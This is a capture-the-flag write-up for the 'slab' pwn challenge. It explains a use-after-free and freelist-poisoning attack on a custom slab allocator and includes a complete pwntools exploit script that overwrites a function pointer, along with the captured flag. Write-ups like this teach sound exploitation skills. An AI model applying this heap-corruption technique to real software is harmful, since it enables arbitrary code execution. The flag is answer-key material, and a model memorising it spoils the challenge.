# slab -- Pwn

**Flag:** `isfcr{cust0m_sl4b_n0_gl1bc_r3c1p3_s4v3s_y0u}`
**Points:** 500
**Solved by:** vikas1337
**Tools:** see script below
**Scripts:** `solve.py` is vikas1337's original solve script, included verbatim.

## Summary

A remote note store (no binary given; protocol reverse-engineered by probing) built on a custom slab allocator. `free` leaves the chunk usable (UAF) and the intrusive freelist `next` pointer is only XOR-obfuscated with a per-process key that `read` leaks for free. Poison the `next` link to an arbitrary address, allocate it back for an arbitrary write, overwrite `report`'s indirect call target with the flag-printing routine, then call `report`.

## Solution

### Step 1: Leak the freelist key (UAF)

Statically-linked non-PIE @ `0x400000`. Menu: `alloc | free <i> | edit <i> <hex> | read <i> | report | quit`; `alloc` = 96-byte note (16 slots). `free` does **not** clear the chunk or null the slot, and `edit`/`read` work on freed notes. The freelist stores `next` in the freed chunk's first 8 bytes XOR-obfuscated: `stored = addr ^ KEY`. The first free into the empty list stores `0 ^ KEY = KEY`, which `read` leaks directly.

### Step 2: Poison → arbitrary write → trigger report

Because the chunk stays usable, `edit` rewrites that `next` to `T ^ KEY`; then `alloc; alloc` returns a note whose buffer is the arbitrary address `T`. `report` executes `call [0x4b50d0]`; the routine at `0x4022e6` opens `flag.txt` and `write()`s it to the client socket. So arbitrary-write `[0x4b50d0] = 0x4022e6` and send `report`. The script re-leaks the key each run, surviving the server's key-rotating restarts.

```python
#!/usr/bin/env python3
# Solve for "slab" (pwn 500) -- nc 0.cloud.chals.io 20535
import struct, binascii, time
from pwn import remote, context
context.log_level = 'error'

HOST, PORT = '0.cloud.chals.io', 20535
FUNCPTR = 0x4b50d0   # report() calls [FUNCPTR]
FLAGFN  = 0x4022e6   # reads flag.txt and writes it to the client

def conn():
    for _ in range(12):
        try:
            r = remote(HOST, PORT, timeout=25); r.recvuntil(b'\n> ', timeout=6); return r
        except Exception:
            time.sleep(1.0)
    raise SystemExit("cannot connect")

def cmd(r, c, t=5):
    r.sendline(c.encode() if isinstance(c, str) else c)
    try:    return r.recvuntil(b'\n> ', timeout=t)
    except Exception: return r.recv(timeout=t)

def dec(b):
    return binascii.unhexlify(b.split(b'data ', 1)[1].split(b'\n')[0])

r = conn()
cmd(r, 'alloc')                                             # idx0 = real slab chunk
cmd(r, 'free 0')                                            # push it; its 'next' := 0 ^ KEY
KEY = struct.unpack('<Q', dec(cmd(r, 'read 0'))[:8])[0]     # leak KEY
print('[*] KEY =', hex(KEY))

cmd(r, 'edit 0 ' + struct.pack('<Q', FUNCPTR ^ KEY).hex())  # poison 'next' -> FUNCPTR
cmd(r, 'alloc')                                             # pop chunk -> idx0 ; head = FUNCPTR
cmd(r, 'alloc')                                             # pop FUNCPTR -> idx1 (buffer == &funcptr)
cmd(r, 'edit 1 ' + struct.pack('<Q', FLAGFN).hex())         # [FUNCPTR] = FLAGFN
print('[*] report funcptr overwritten -> 0x4022e6; triggering report')

r.sendline(b'report')
time.sleep(1)
data = b''
try:
    while True:
        c = r.recv(timeout=4)
        if not c: break
        data += c
except Exception:
    pass
print('[*] output:')
print(data.decode('latin1', errors='replace'))
r.close()
```

Proof run: `[*] KEY = 0x1a1c2151cf9d33d9` … output `isfcr{cust0m_sl4b_n0_gl1bc_r3c1p3_s4v3s_y0u}`.
